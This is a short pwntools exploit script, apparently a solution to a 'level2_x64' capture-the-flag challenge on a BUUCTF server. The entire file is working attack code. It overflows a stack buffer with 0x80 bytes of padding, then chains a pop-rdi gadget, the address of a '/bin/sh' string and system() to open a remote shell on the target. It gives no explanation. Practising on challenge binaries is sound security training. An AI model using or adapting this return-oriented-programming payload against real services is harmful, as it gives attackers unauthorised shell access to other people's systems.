from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",29403)

elf=ELF("/home/lixingjian/pwn/level2_x64")

pop_rdi_addr=0x4006b3

binsh=0x600A90

system_addr=elf.symbols['system']

payload=b'a'*(0x80)+p64(0xdeadbeef)+p64(pop_rdi_addr)+p64(binsh)+p64(system_addr)

p.sendline(payload)

p.interactive()